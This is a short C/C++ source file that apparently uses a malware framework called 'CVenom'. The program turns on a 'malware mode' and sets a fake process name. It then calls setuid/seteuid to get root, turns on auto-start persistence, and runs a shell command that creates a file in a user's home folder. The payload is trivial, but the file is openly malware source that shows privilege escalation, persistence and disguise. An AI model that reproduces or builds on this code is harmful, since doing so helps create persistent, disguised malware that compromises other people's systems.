#include "../../CVenom.h"
#include "../../RuntimeTools.h"
#include "../../DominationTools.h"

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	SetMalwareMode(ON);
	SetMalwareFakeName("MothersAss");

	RuntimeTools		Runner;
	DominationTools		Dominator;

	setuid(0);
	seteuid(0);

	Dominator.EnableAutoStart();
	Runner.SystemExecute("touch /home/mahmoud/ayrrr");

	cvexit(MALWARE_EXIT);
}
